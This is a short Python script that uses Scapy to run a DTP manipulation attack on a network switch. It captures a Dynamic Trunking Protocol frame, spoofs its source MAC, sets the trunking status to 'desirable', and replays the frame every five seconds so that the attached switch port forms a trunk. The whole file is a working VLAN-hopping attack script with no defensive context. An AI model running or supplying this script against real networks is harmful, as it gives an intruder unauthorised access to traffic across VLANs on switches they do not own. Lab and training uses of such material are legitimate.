# In the name of God

from scapy.all import *

#### DTP manipulation

# load DTP protocol in Scapy
load_contrib('dtp')

# sniff a DTP packet to manipulate
pkt = sniff(filter='ether dst 01:00:0c:cc:cc:cc', count=1, iface='local1')

# [optioanl] show captured packet
print('================== original packet==========')
pkt[0].show()

# change src mac
pkt[0].src = '00:00:00:00:00:01'

# change DTP mode (set to Desirable)
pkt[0][DTP][DTPStatus].status = '\x03'

# [optional] show manipulated packet
print('================ manipulated packet==========')
pkt[0].show()

# send Packet in a loop
while True:
    sendp(pkt[0], loop=0, verbose=1, iface='local1')
    time.sleep(5)


